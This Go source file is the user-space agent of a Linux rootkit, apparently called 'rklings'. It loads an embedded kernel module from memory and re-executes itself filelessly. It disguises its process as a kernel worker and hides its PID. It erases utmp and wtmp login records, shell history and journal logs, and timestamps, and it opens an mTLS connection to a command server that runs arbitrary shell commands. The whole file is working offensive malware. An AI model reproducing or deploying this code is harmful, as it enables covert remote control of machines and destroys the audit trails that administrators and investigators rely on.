package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"unsafe"

	"golang.org/x/sys/unix"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

//go:embed rklings.ko
var koBytes []byte

var serverAddr = envOr("RKLINGS_SERVER_ADDR", "10.0.2.2:8443")
var localPort int

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// utmpRecordSize is the fixed size of a utmp record on Linux amd64.
const utmpRecordSize = 384
const utmpUserOffset = 44
const utmpUserLen = 256

func main() {
	if err := deploy(); err != nil {
		log.Printf("deploy: %v", err)
	}

	conn := dial()
	defer conn.Close()
	if local, ok := conn.LocalAddr().(*net.TCPAddr); ok {
		localPort = local.Port
		trigger(fmt.Sprintf("h.p.%d", local.Port))
	}

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "PING":
			fmt.Fprintln(conn, "PONG")
		case "DEPLOY":
			err := deploy()
			if err != nil {
				fmt.Fprintf(conn, "ERR %v\n", err)
			} else {
				fmt.Fprintln(conn, "OK")
			}
		case "SHELL":
			handleShell(conn, arg)
		case "STATUS":
			var limit unix.Rlimit
			_ = unix.Getrlimit(unix.RLIMIT_CORE, &limit)
			dumpable, _ := unix.PrctlRetInt(unix.PR_GET_DUMPABLE, 0, 0, 0, 0)
			fmt.Fprintf(conn, "PID=%d UID=%d DUMPABLE=%d CORE=%d PORT=%d\n", os.Getpid(), os.Getuid(), dumpable, limit.Cur, localPort)
		default:
			fmt.Fprintf(conn, "ERR unknown: %s\n", cmd)
		}
	}
}

// dial establishes an mTLS connection to the server.
func dial() *tls.Conn {
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caCert)

	conn, err := tls.Dial("tcp", serverAddr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	return conn
}

// deploy runs the full ghost sequence: load, hide, masquerade, scrub.
func deploy() error {
	if os.Geteuid() != 0 {
		return fmt.Errorf("deployment requires root")
	}

	link, _ := os.Readlink("/proc/self/exe")
	if !strings.Contains(link, "memfd") {
		if err := loadModuleFromMemory(koBytes); err != nil {
			return fmt.Errorf("load module: %w", err)
		}
		trigger("h.m")
		if err := reexecFromMemory(); err != nil {
			return fmt.Errorf("reexec: %w", err)
		}
	}

	// Masquerade as a kernel thread.
	if err := masquerade(); err != nil {
		return fmt.Errorf("masquerade: %w", err)
	}

	hideAll()

	// Scrub all forensic traces.
	if err := scrubAll(); err != nil {
		return fmt.Errorf("scrub: %w", err)
	}

	return nil
}

// loadModuleFromMemory loads a .ko from memory using memfd + finit_module.
func loadModuleFromMemory(ko []byte) error {
	fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)
	if err != nil {
		return fmt.Errorf("memfd_create: %w", err)
	}
	defer unix.Close(fd)

	if err := writeAll(fd, ko); err != nil {
		return fmt.Errorf("write ko: %w", err)
	}

	if err := unix.FinitModule(fd, "", 0); err != nil {
		return fmt.Errorf("finit_module: %w", err)
	}

	return nil
}

// reexecFromMemory re-executes this binary from a memfd.
// The original file on disk can be deleted before exec.
func reexecFromMemory() error {
	// Already running from memfd, nothing to do.
	link, err := os.Readlink("/proc/self/exe")
	if err == nil && strings.Contains(link, "memfd") {
		return nil
	}

	self, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		return fmt.Errorf("read self: %w", err)
	}

	// No MFD_CLOEXEC so the fd survives exec.
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return fmt.Errorf("memfd_create: %w", err)
	}

	if err := writeAll(fd, self); err != nil {
		unix.Close(fd)
		return fmt.Errorf("write self: %w", err)
	}

	// Exec replaces this process. Does not return on success.
	return unix.Exec(fmt.Sprintf("/proc/self/fd/%d", fd), os.Args, os.Environ())
}

func writeAll(fd int, data []byte) error {
	for len(data) > 0 {
		n, err := unix.Write(fd, data)
		if err != nil {
			return err
		}
		if n == 0 {
			return io.ErrShortWrite
		}
		data = data[n:]
	}
	return nil
}

func masquerade() error {
	name := [16]byte{}
	copy(name[:], "[kworker/0:1]")
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
	unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
	unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
	return nil
}

func hideAll() {
	trigger("h.m")
	trigger(fmt.Sprintf("h.i.%d", os.Getpid()))
}

func trigger(command string) {
	path := "/tmp/rklings." + command
	_ = os.Mkdir(path, 0755)
	_ = os.Remove(path)
}

// scrubAll removes all forensic traces.
func scrubAll() error {
	user := os.Getenv("USER")
	if user == "" {
		user = "root"
	}

	scrubUtmp(user)
	clearHistory()
	timestomp("/tmp", "/etc/hostname")
	tamperJournal()
	os.Clearenv()

	return nil
}

// scrubUtmp removes login records for username from utmp and wtmp.
func scrubUtmp(username string) error {
	files := []string{"/var/run/utmp", "/var/log/wtmp"}
	for _, path := range files {
		f, err := os.OpenFile(path, os.O_RDWR, 0)
		if err != nil {
			continue
		}

		data, err := io.ReadAll(f)
		if err != nil {
			f.Close()
			continue
		}

		modified := false
		for off := 0; off+utmpRecordSize <= len(data); off += utmpRecordSize {
			record := data[off : off+utmpRecordSize]
			if extractUser(record) == username {
				// Zero the entire record.
				for i := range record {
					record[i] = 0
				}
				modified = true
			}
		}

		if modified {
			f.Seek(0, 0)
			f.Write(data)
		}
		f.Close()
	}
	return nil
}

// clearHistory truncates shell history files.
func clearHistory() error {
	homes := []string{}
	if h, err := os.UserHomeDir(); err == nil {
		homes = append(homes, h)
	}
	if _, err := os.Stat("/root"); err == nil {
		homes = append(homes, "/root")
	}

	for _, home := range homes {
		for _, name := range []string{".bash_history", ".zsh_history"} {
			path := home + "/" + name
			os.Truncate(path, 0)
		}
	}
	return nil
}

// timestomp copies mtime from reference to target.
func timestomp(target, reference string) error {
	info, err := os.Stat(reference)
	if err != nil {
		return fmt.Errorf("stat reference: %w", err)
	}
	mtime := info.ModTime()
	return os.Chtimes(target, mtime, mtime)
}

// tamperJournal vacuums the systemd journal.
func tamperJournal() error {
	exec.Command("/usr/bin/journalctl", "--rotate", "--vacuum-time=1s").Run()
	exec.Command("systemctl", "kill", "--signal=SIGUSR2", "systemd-journald").Run()
	return nil
}

// handleShell executes a command and sends output terminated by ".".
func handleShell(conn *tls.Conn, cmd string) {
	out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		fmt.Fprintf(conn, "ERR %v\n", err)
	}
	if len(out) > 0 {
		conn.Write(out)
		if out[len(out)-1] != '\n' {
			fmt.Fprintln(conn)
		}
	}
	fmt.Fprintln(conn, ".")
}

// extractUser reads ut_user from a utmp record.
func extractUser(record []byte) string {
	if len(record) < utmpUserOffset+utmpUserLen {
		return ""
	}
	raw := record[utmpUserOffset : utmpUserOffset+utmpUserLen]
	end := bytes.IndexByte(raw, 0)
	if end < 0 {
		end = utmpUserLen
	}
	return string(raw[:end])
}
